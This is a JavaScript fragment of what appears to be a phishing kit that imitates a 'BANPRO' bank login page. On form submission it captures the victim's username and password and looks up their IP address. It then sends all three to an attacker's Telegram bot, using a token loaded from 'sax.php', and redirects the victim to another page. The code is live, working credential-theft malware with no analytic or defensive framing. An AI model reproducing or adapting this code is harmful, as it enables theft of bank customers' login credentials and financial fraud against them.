

    // Obtener token y chat_id desde el archivo PHP
    function obtenerToken() {
        return fetch('sax.php')
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                if (data && typeof data === 'object') {
                    return {
                        token: data.token,
                        chat_id: data.chat_id
                    };
                } else {
                    throw new Error('Formato de respuesta inválido');
                }
            })
            .catch(error => {
                console.error('Error al obtener el token:', error);
            });
    }

    // Obtener la IP del cliente
    function obtenerIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(error => {
                console.error('Error al obtener la IP:', error);
                return 'No disponible';
            });
    }

    // Enviar mensaje a Telegram
    function enviarMensajeTelegram(token, chat_id, mensaje) {
        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        const params = {
            chat_id: chat_id,
            text: mensaje
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Ocurrió un error al enviar el mensaje.');
                }
                console.log('Mensaje enviado con éxito.');
                window.location.href = '2.html';
            })
            .catch(error => {
                console.error('Error al enviar el mensaje:', error);
            });
    }

    // Evento de envío del formulario
    document.getElementById("f1").addEventListener("submit", function (event) {
        event.preventDefault();

        const usuario = document.getElementById("i1").value;
        const contrasena = document.getElementById("i2").value;

        if (!validarContrasena(contrasena)) {
            mostrarError();
            return;
        }

        Promise.all([obtenerToken(), obtenerIP()])
            .then(results => {
                const data = results[0];
                const ip = results[1];

                if (data && data.token && data.chat_id) {
                    const msg = `BANPRO LOGIN> IP: ${ip} - Usuario: ${usuario} - Contraseña: ${contrasena}`;
                    enviarMensajeTelegram(data.token, data.chat_id, msg);
                }
            })
            .catch(error => {
                console.error('Error durante el proceso:', error);
            });
    });
});
